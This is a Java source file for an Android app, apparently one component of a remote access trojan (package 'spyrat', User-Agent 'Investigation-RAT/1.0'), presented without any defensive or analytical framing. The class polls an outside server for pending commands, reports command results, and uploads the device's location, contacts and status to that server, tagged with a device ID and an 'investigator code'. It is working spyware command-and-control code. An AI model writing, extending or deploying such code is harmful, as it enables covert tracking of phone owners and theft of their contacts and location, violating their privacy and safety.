package com.spyrat.investigation;

import android.content.Context;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class InvestigatorApiClient {
    private static final String TAG = "InvestigatorApiClient";
    private static final String BASE_URL = "https://GhostTester.pythonanywhere.com";
    private Context context;
    private String investigatorCode;
    private String deviceId;
    private ExecutorService executor;
    
    public InvestigatorApiClient(Context context, String investigatorCode, String deviceId) {
        this.context = context;
        this.investigatorCode = investigatorCode;
        this.deviceId = deviceId;
        this.executor = Executors.newFixedThreadPool(3);
        Log.d(TAG, "🔧 API Client Created - Code: " + investigatorCode + ", Device: " + deviceId);
    }
    
    // ==================== VERIFY INVESTIGATOR CODE ====================
    public boolean verifyInvestigatorCode() {
        try {
            Log.d(TAG, "🔍 Verifying investigator code: " + investigatorCode);
            
            JSONObject requestBody = new JSONObject();
            requestBody.put("investigator_code", investigatorCode);
            
            JSONObject response = makeApiCall("/api/investigator/verify-code", "POST", requestBody);
            
            if (response != null && response.getBoolean("valid")) {
                String investigatorName = response.getString("investigator_name");
                Log.d(TAG, "✅ Investigator code verified: " + investigatorName);
                return true;
            } else {
                Log.e(TAG, "❌ Invalid investigator code");
                return false;
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Verification error: " + e.getMessage());
            return false;
        }
    }
    
    // ==================== CHECK FOR PENDING COMMANDS ====================
    public JSONArray getPendingCommands() {
        try {
            String url = BASE_URL + "/api/investigator/commands?device_id=" + deviceId + 
                        "&investigator_code=" + investigatorCode;
            
            Log.d(TAG, "📡 Fetching commands from: " + url);
            
            JSONObject response = makeApiCall(url, "GET", null);
            
            if (response != null && response.has("commands")) {
                JSONArray commands = response.getJSONArray("commands");
                Log.d(TAG, "📥 Received " + commands.length() + " commands");
                return commands;
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Get commands error: " + e.getMessage());
        }
        return new JSONArray();
    }
    
    // ==================== SEND DATA TO INVESTIGATOR ====================
    public void sendDataToInvestigator(String dataType, JSONObject dataContent) {
        executor.execute(() -> {
            try {
                Log.d(TAG, "📤 Sending data to investigator: " + dataType);
                
                JSONObject requestBody = new JSONObject();
                requestBody.put("device_id", deviceId);
                requestBody.put("investigator_code", investigatorCode);
                requestBody.put("data_type", dataType);
                requestBody.put("data_content", dataContent);
                
                JSONObject response = makeApiCall("/api/investigator/data", "POST", requestBody);
                
                if (response != null && "success".equals(response.optString("status"))) {
                    Log.d(TAG, "✅ Data sent successfully: " + dataType);
                } else {
                    Log.e(TAG, "❌ Failed to send data: " + dataType);
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Send data error: " + e.getMessage());
            }
        });
    }
    
    // ==================== SEND COMMAND RESPONSE ====================
    public void sendCommandResponse(String commandId, String status, String message) {
        try {
            JSONObject responseData = new JSONObject();
            responseData.put("command_id", commandId);
            responseData.put("status", status);
            responseData.put("message", message);
            responseData.put("device_id", deviceId);
            responseData.put("investigator_code", investigatorCode);
            responseData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("command_response", responseData);
            Log.d(TAG, "✅ Command response sent: " + commandId + " - " + status);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send command response error: " + e.getMessage());
        }
    }
    
    // ==================== UPDATE DEVICE STATUS ====================
    public void updateDeviceStatus(String status, JSONObject deviceInfo) {
        try {
            JSONObject statusData = new JSONObject();
            statusData.put("status", status);
            statusData.put("device_info", deviceInfo);
            statusData.put("device_id", deviceId);
            statusData.put("investigator_code", investigatorCode);
            statusData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("device_status", statusData);
            Log.d(TAG, "✅ Device status updated: " + status);
        } catch (Exception e) {
            Log.e(TAG, "❌ Update device status error: " + e.getMessage());
        }
    }
    
    // ==================== SEND LOCATION DATA ====================
    public void sendLocationData(JSONObject locationInfo) {
        try {
            JSONObject locationData = new JSONObject();
            locationData.put("location", locationInfo);
            locationData.put("device_id", deviceId);
            locationData.put("investigator_code", investigatorCode);
            locationData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("location_data", locationData);
            Log.d(TAG, "✅ Location data sent");
        } catch (Exception e) {
            Log.e(TAG, "❌ Send location data error: " + e.getMessage());
        }
    }
    
    // ==================== SEND CONTACTS DATA ====================
    public void sendContactsData(JSONArray contacts) {
        try {
            JSONObject contactsData = new JSONObject();
            contactsData.put("contacts", contacts);
            contactsData.put("count", contacts.length());
            contactsData.put("device_id", deviceId);
            contactsData.put("investigator_code", investigatorCode);
            contactsData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("contacts_data", contactsData);
            Log.d(TAG, "✅ Contacts data sent: " + contacts.length() + " contacts");
        } catch (Exception e) {
            Log.e(TAG, "❌ Send contacts data error: " + e.getMessage());
        }
    }
    
    // ==================== UTILITY METHODS ====================
    private JSONObject makeApiCall(String endpoint, String method, JSONObject requestBody) {
        HttpURLConnection connection = null;
        try {
            URL url;
            if (endpoint.startsWith("http")) {
                url = new URL(endpoint);
            } else {
                url = new URL(BASE_URL + endpoint);
            }
            
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod(method);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Investigation-RAT/1.0");
            connection.setConnectTimeout(30000);
            connection.setReadTimeout(30000);
            
            if (requestBody != null && "POST".equals(method)) {
                connection.setDoOutput(true);
                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = requestBody.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
            }
            
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                
                return new JSONObject(response.toString());
            } else {
                Log.e(TAG, "❌ API call failed: " + responseCode);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ API call error: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
        return null;
    }
    
    public void cleanup() {
        try {
            if (executor != null) {
                executor.shutdown();
            }
            Log.d(TAG, "🧹 InvestigatorApiClient cleaned up");
        } catch (Exception e) {
            Log.e(TAG, "❌ Cleanup error: " + e.getMessage());
        }
    }
}
